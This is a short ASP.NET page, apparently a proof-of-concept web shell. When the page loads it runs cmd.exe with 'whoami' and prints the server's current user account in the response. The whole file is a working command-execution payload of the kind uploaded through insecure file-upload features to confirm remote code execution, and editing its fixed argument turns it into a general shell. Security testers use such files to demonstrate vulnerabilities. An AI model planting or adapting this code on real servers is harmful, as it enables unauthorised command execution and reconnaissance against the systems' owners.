<%@ Page Language="C#" %>
<script runat="server">
    void Page_Load(Object sender, EventArgs e) {
        // Execute "whoami" command and capture the output
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c whoami";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;
        process.Start();

        // Read output from command
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        // Display output
        Response.Write("Current User: " + output);
    }
</script>
